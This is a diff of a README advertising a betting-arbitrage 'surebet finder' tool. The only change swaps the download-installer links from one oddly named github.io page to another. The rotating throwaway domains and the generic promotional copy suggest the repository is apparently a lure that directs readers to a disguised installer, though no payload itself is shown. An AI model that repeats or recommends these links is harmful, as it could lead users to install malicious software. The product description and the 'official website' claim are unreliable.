@@ -2,7 +2,7 @@
 
 Bookmaker Arbitrage Tools Complete Suite is an advanced automated surebet finder designed for professional bettors. This tool scans multiple bookmakers in real-time to identify profitable arbitrage opportunities and maximize your earnings. With its comprehensive features and user-friendly interface, it is the ultimate solution for arb betting in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -59,6 +59,6 @@ We regularly update the tool to include new bookmakers, improve scanning algorit
 
 For the latest version of Bookmaker Arbitrage Tools Complete Suite, download it from the official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 Ensure you always use the most recent version to benefit from the latest features, bug fixes, and security enhancements. Happy arbitrage betting!
